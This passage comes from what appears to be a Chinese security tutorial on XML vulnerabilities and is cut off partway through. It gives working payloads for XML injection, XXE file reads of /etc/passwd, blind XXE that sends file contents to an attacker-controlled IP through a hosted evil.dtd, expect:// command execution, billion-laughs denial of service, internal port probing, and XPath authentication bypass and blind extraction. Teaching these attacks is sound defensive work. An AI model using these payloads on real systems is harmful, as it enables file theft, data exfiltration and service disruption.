class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<br><br>example:<br>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [    <br>    &lt;!ENTITY writer &quot;Dawn&quot;&gt;<br>    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;<br>]&gt;<br>&lt;test&gt;&amp;writer;©right;&lt;/test&gt;<br></code></pre></td></tr></table></figure><ol start="2" type="1"><li>外部实体</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<br><br>example:<br>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [    <br>    &lt;!ENTITY writer &quot;Dawn&quot;&gt;<br>    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;<br>]&gt;<br>&lt;test&gt;&amp;writer;©right;&lt;/test&gt;<br></code></pre></td></tr></table></figure><p>根据不同语言有以下可支持的协议：</p><figure><img src="/img/XML漏洞_img/clip_image002-16969084628491.gif"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="xml注入">XML注入</h2><h3 id="原理">原理</h3><p>与sql闭合类似，闭合标签达到更改、添加数据的效果</p><p>前提条件</p><pre><code class="hljs">1. 用户能够控制数据的输入1. 程序有拼凑的数据</code></pre><h3 id="example">example</h3><p>test.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">manager</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>zhangsa<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">manager</span>&gt;</span><br></code></pre></td></tr></table></figure><p>注入payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hack<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>hacker<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br></code></pre></td></tr></table></figure><p>server接收结果</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">manager</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>zhangsa<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>hack<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>hacker<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">manager</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样就通过XML注入添加了一个名为<code>hack</code>，密码为<code>hacker</code>的管理员账户。XML注入两大要素：<strong>标签闭合和获取XML表结构</strong></p><h2 id="xxe漏洞">XXE漏洞</h2><h3 id="原理-1">原理</h3><p><strong>外部引用</strong>可以支持http，file，ftp等协议如果一个接口支持接收xml数据，且没有对xml数据做任何安全上的措施，就可能导致XXE漏洞攻击者可以构造一个XML文档，文档里引用外部实体通过协议进行读取文件等操作例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">一般实体+外部实体<br>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [    <br>    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>]&gt;<br>&lt;test&gt;&amp;file;&lt;/test&gt;<br><br>参数实体+外部实体<br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [  <br>    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>    %file;<br>]&gt;<br></code></pre></td></tr></table></figure><h3 id="利用条件">利用条件</h3><p>php中解析xml用的是libxml库</p><p>版本&lt;=2.9.0的php中</p><p>simplexml_load_string()函数将正确的XML字符转化为php中的SimpleXMLElement对象</p><p>而&gt;2.9.0的，默认是禁止解析xml外部实体内容的</p><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致攻击者可以构造一个恶意的XML</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>hosts <span class="hljs-comment">#主机名和ip配置文件</span><br><span class="hljs-regexp">/proc/</span>net/arp <span class="hljs-comment">#流量包的信息</span><br><span class="hljs-regexp">/proc/</span>net/tcp <span class="hljs-comment">#活动连接的信息</span><br><span class="hljs-regexp">/proc/</span>net/udp <span class="hljs-comment">#活动连接的信息</span><br><span class="hljs-regexp">/proc/</span>net/dev <span class="hljs-comment">#提供给用户读取或更改网络适配器及统计信息</span><br><span class="hljs-regexp">/proc/</span>net/fib_trie <span class="hljs-comment">#路由缓存</span><br></code></pre></td></tr></table></figure><h3 id="xxe攻击类别及实例">XXE攻击类别及实例</h3><ol type="1"><li>有回显</li></ol><p>可以用下面的两种方式：</p><ul><li>直接使用外部实体调用<code>file://</code>、<code>php://filter/read=convert.base64-encode/resource=</code>等函数去读取本地文件</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?</span>xml version = <span class="hljs-string">&quot;1.0&quot;</span> encoding = <span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE any [    <br>    &lt;!ENTITY file SYSTEM <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;<br>]&gt;<br>&lt;test&gt;&amp;file;&lt;/test&gt;<br></code></pre></td></tr></table></figure><ul><li>将外部实体引用的 URL 设置到本地服务器，本地构建恶意 dtd文件，远程注入</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE any [    <br>    &lt;!ENTITY file SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot;&gt;<br>%file;]&gt;<br>&lt;test&gt;&amp;evil;&lt;/test&gt;<br>    <br>//外部dtd内容   <br>&lt;!ENTITY evil SYSTEM &quot;file:///etc/passwd&quot; &gt;<br></code></pre></td></tr></table></figure><ol start="2" type="1"><li>无回显</li></ol><p>Blind XXE外带，建立dtd文件进行远程协议调用文件</p><p>Blind XXE原理</p><p>先在受害机调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>evil.dtd</code>。</p><p>再调用<code>evil.dtd</code>中的<code>%file</code>。<code>%file</code>获取受害机上面的敏感文件，然后将<code>%file</code>的返回结果传到<code>%send</code>。</p><p>然后受害机调用<code>%send</code>把读取到的数据发送到远程服务器上。</p><p>假设攻击机ip为：<code>192.168.201.128</code></p><p>vps上部署evil.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#x27;http://192.168.201.128/?content=%file;&#x27;&gt;&quot;&gt; %payload;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE test[<br>    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/qwzf.txt&quot;&gt;<br>    &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.201.128/evil.dtd&quot;&gt;<br>    %dtd;<br>    %send;<br>]&gt;<br></code></pre></td></tr></table></figure><p>进行XXE攻击后，服务器会把文件内容发送到攻击者服务器(apache日志记录)</p><p>攻击机上：<code>tail -f /var/log/apache2/access.log</code></p><h3 id="特殊协议攻击">特殊协议攻击</h3><h4 id="执行系统命令">执行系统命令</h4><p>条件：在安装expect扩展的PHP环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE xxe [<br>&lt;!ELEMENT name ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;<br>&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;<br></code></pre></td></tr></table></figure><h4 id="ddos">ddos</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE lolz [&lt;!ENTITY lol &quot;lol&quot;&gt;<br>&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;<br>&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;<br>&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;<br>&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;<br>&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;<br>&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;<br>&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;<br>&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;<br>]&gt;<br>&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;<br></code></pre></td></tr></table></figure><h4 id="探测内网端口">探测内网端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE xxe [<br>&lt;!ELEMENT name ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;<br>]&gt;<br>&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;<br></code></pre></td></tr></table></figure><h2 id="xpath注入">xpath注入</h2><h3 id="原理-2">原理</h3><p>XPath 注入利用 XPath解析器的松散输入和容错特性，能够在URL、表单或其它信息上附带恶意的XPath查询代码，以获得高权限信息的访问权，类似于SQL注入。</p><p>注入对象是一个存储数据的XML文件。因为xpath不存在访问控制，所以不会遇到许多在SQL注入中经常遇到的访问限制。注入出现的位置也就是<code>cookie</code>，<code>headers</code>，<code>request</code>，<code>parameters/input</code>等</p><h3 id="example-1">example</h3><p>test.xml(用于存储username和password)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> <br>            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>test1<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>test1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> <br>            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>test2<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>test2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xml</span>=<span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">&#x27;test.xml&#x27;</span>);<br><span class="hljs-variable">$name</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>];<br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;/root/users/user[username/text()=&#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27; and password/text()=&#x27;&quot;</span>.<span class="hljs-variable">$pwd</span>.<span class="hljs-string">&quot;&#x27;]&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$query</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-variable">$xml</span>-&gt;<span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$query</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h2&gt;Welcome&lt;/h2&gt;&#x27;</span>;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;ID:&#x27;</span>.<span class="hljs-variable">$value</span>-&gt;id;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;Username:&#x27;</span>.<span class="hljs-variable">$value</span>-&gt;username;<br>    &#125;<br>&#125;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>simplexml_load_file</code>，加载xml文件</p><p>正常查询：<code>?name=test1&amp;pwd=test1</code></p><p>server端语句：<code>/root/users/user[username/text()='test1'and password/text()='test1']</code></p><p>注入语句：<code>?name=' or 1=1 or ''='&amp;pwd=1</code></p><p>server语句：<code>/root/users/user[username/text()='' or 1=1 or ''='' and password/text()='1']</code></p><h3 id="注入payload">注入payload</h3><h4 id="一般注入形式">一般注入形式</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//原php代码中的查询语句</span><br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;user/username[@name=&#x27;&quot;</span>.<span class="hljs-variable">$user</span>.<span class="hljs-string">&quot;&#x27;]&quot;</span>;<br><span class="hljs-comment">//构造payload1：user1&#x27; or 1=1 or &#x27;&#x27;=&#x27;</span><br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;user/username[@name=&#x27;user1&#x27; or 1=1 or &#x27;&#x27;=&#x27;&#x27;]&quot;</span>;<br><span class="hljs-comment">//构造payload2：&#x27;]|//*|//*[&#x27;</span><br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;user/username[@name=&#x27;user1&#x27;]|//*|//*[&#x27;&#x27;]&quot;</span>;<br></code></pre></td></tr></table></figure><h4 id="盲注">盲注</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs PHP">链：/ -&gt; root -&gt; user/user -&gt; username/email/password<br>判断根节点下的节点数<br><span class="hljs-string">&#x27;or count(/)=1  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>     <span class="hljs-comment">//根节点数量为1</span><br><span class="hljs-string">&#x27;or count(/*)=1 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>     <span class="hljs-comment">//根节点下只有一个子节点</span><br>判断根节点下节点长度<br><span class="hljs-string">&#x27;or string-length(name(/*[1]))=1 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>      <span class="hljs-comment">//判断根节点下的节点长度为1</span><br>判断根节点下节点名称<br><span class="hljs-string">&#x27;or substring(name(/*[1]), 1, 1)=&#x27;</span>r<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>  <span class="hljs-comment">//猜根节点下的节点名称</span><br><span class="hljs-string">&#x27;or substring(name(/*[1]), 2, 1)=&#x27;</span>o<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br>假设根节点下子节点名称为root，判断子节点下的的节点<br><span class="hljs-string">&#x27;or count(/root)=1  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>                  <span class="hljs-comment">//root节点数量为1</span><br><span class="hljs-string">&#x27;or count(/root/user/*)&gt;1 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>            <span class="hljs-comment">//root下有两个或以上节点</span><br><span class="hljs-string">&#x27;or string-length(name(/root/*[1]))=4  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>    <span class="hljs-comment">//判断第一个子节点长度为4</span><br>猜解root下的节点名称：<br><span class="hljs-string">&#x27;or substring(name(/root/*[1]), 1, 1)=&#x27;</span>u<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>    <span class="hljs-comment">//猜root节点下的第一个节点名称</span><br><span class="hljs-string">&#x27;or substring(name(/root/*[1]), 2, 1)=&#x27;</span>s<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br>假设root下节点名称为user<br><span class="hljs-string">&#x27;or count(/root/user)=2  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>   <span class="hljs-comment">//user节点有两个，则可以猜测出root节点结构，root下两个节点，均为user节点</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 1, 1)=&#x27;</span>u<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 2, 1)=&#x27;</span>s<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br>判断user节点的子节点长度<br><span class="hljs-string">&#x27;or string-length(name(/root/user[position()=1]/*[1]))=8 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>  <span class="hljs-comment">//user下第一个子节点长名称度为8</span><br>判断user节点的下子节点名称<br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 1, 1)=&#x27;</span>u<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>  <span class="hljs-comment">//猜user节点下的第一个节点名称</span><br>...<br>最终所有子节点值验证如下：<br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 1)=&#x27;</span>username<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[2]), 1)=&#x27;</span>email<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[3]), 1)=&#x27;</span>password<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>猜有无子节点<br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/username/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>   <br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/email/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span> <br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/accounttype/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/username/password/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-literal">false</span>则没有节点<br>读最后节点长度<br><span class="hljs-string">&#x27;or string-length((//user[position()=1]/username[position()=1]))=6 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span> <span class="hljs-comment">//第一个user下username长度</span><br>读值<br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),1,1)=&#x27;</span>f<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),2,1)=&#x27;</span>l<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or 